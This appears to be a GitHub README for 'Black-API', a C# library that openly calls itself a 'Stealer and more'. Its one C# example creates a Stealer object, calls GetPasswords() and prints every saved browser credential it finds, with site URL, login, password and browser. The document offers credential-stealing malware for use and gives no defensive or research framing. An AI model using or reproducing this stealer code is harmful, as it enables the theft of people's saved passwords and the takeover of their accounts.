# Black-API
Stealer and more

[![Codacy Badge](https://app.codacy.com/project/badge/Grade/7576b1dcd41048f2843e5d4bee57d7bc)](https://www.codacy.com/gh/Nekiplay/Black-API/dashboard?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=Nekiplay/Black-API&amp;utm_campaign=Badge_Grade)

**Example:**
```C#
BlackAPI.Stealer stealer = new BlackAPI.Stealer();
var stealerresult = stealer.GetPasswords();
if (stealerresult.Work)
{
    foreach (var password in stealerresult.Passwords)
    {
        Console.WriteLine("Url: " + password.url);
        Console.WriteLine("Login: " + password.login);
        Console.WriteLine("Password: " + password.password);
        Console.WriteLine("Browser: " + password.browser);
    }
    Console.WriteLine("Total passwords: " + stealerresult.Passwords.Count);
}
else
{
    Console.WriteLine("Passwords not found");
}
```
